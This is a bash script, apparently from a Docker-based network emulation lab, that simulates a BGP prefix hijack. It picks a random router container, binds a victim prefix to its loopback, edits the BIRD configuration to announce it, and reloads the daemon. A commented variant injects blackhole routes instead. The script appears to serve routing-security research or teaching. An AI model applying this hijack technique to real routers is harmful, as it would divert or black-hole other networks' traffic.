#!/bin/bash

# To run This hijack provide the Prefix as command arguments 
# ex: ./Random_Hijack 74.80.186.0/25 74.80.186.128/25

random_con_ID=$(docker ps -f "name=router" -q | shuf -n 1)

hij_c="perl -0777 -i.original -pe 's/protocol direct local_nets {
    ipv4 {
        table t_direct;
        import all;
    };

    interface \"net0\";

}/protocol direct local_nets {
    ipv4 {
        table t_direct;
        import all;
    };

    interface \"net0\";
    interface \"lo\";

}/' /etc/bird/bird.conf"



# hij_c="echo -e 'protocol static hijacks {\n    ipv4 {\n        table t_bgp;\n    };
#     route $1 blackhole   { bgp_large_community.add(LOCAL_COMM); };
#     route $2 blackhole { bgp_large_community.add(LOCAL_COMM); };
# }' >> bird.conf"

text=$(docker ps --format '{{.Names}}' -f "ID=$random_con_ID")
delimiter="-"
string=$text$delimiter

AS_info=()
while [[ $string ]]; do
  AS_info+=( "${string%%"$delimiter"*}" )
  string=${string#*"$delimiter"}
done

echo "#####################################################"
echo "Hijacker ASN: $( tr -d 'as | r' <<<${AS_info[0]})"
echo "Hijacker IP: ${AS_info[2]}"
# echo "Hijacked Prefix: $1 - $2"
echo "Hijacked Prefix: $1"
echo "AS Router Container ID: $random_con_ID"

docker exec $random_con_ID /bin/bash -c "ip addr add $1 dev lo"
docker exec --workdir /etc/bird $random_con_ID /bin/bash -c "$hij_c"
docker exec $random_con_ID /bin/bash -c "birdc configure"
# echo "####### $1 - $2 Prefix is successfully hijacked #######"
echo "####### $1 Prefix is successfully hijacked #######"

